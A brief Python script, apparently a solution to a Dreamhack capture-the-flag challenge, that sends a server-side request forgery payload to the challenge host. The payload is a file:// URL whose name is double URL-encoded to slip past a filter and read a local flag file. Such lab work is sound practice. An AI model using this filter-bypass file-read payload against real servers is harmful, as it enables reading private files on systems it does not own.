import requests

ex_url="<file:///fl%2561g.txt>"
url=f"http://host3.dreamhack.games:13851/request?url={ex_url}&title=test"

res=requests.get(url)

print(res.status_code,res.text)
